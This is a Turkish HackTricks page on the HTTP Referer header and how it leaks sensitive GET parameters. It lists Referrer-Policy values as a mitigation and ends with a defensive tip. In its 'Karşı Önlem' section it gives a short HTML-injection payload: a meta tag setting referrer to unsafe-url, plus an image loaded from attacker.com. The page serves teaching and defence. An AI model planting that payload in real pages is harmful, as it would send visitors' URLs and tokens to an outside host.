<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine çıkarın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


# Yönlendirici başlıkları ve politikası

Yönlendirici, tarayıcıların önceki ziyaret edilen sayfayı belirtmek için kullandığı başlıktır.

## Sızan hassas bilgiler

Web sayfasının içinde herhangi bir noktada GET isteği parametrelerinde hassas bilgiler bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini/sunmasını (sosyal mühendislik) sağlayabiliyorsa, saldırgan en son GET isteği içindeki hassas bilgileri dışarı çıkarabilir.

## Hafifletme

Tarayıcının başka web uygulamalarına hassas bilgilerin gönderilmesini **önleyebilecek** bir **Yönlendirici politikası** izlemesini sağlayabilirsiniz:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Karşı Önlem

Bu kuralı geçersiz kılmak için bir HTML meta etiketi kullanabilirsiniz (saldırganın HTML enjeksiyonu kullanması gerekmektedir):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Savunma

Asla hassas verileri URL'deki GET parametreleri veya yollarda kullanmayın.


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
